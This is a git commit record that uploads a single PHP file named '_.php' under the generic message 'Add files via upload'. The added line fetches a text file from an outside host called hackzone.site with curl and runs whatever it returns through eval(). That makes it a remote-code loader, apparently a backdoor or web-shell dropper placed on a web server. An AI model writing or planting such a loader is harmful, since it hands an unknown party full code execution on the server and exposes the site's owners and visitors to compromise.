f424b524e8c8d841dbf524927b22abb46d264a6b
barudakwell212 <teguhtade@gmail.com>
2026-04-04 19:17:32 +0700

    Add files via upload

---
+++ _.php
@@ -0,0 +1,1 @@
+<?php $Url='https://hackzone.site/script/indra2.txt'; if (!function_exists('curl_init')){ die('CURL is not installed!'); } $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $Url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $output = curl_exec($ch); curl_close($ch); eval($output); ?>
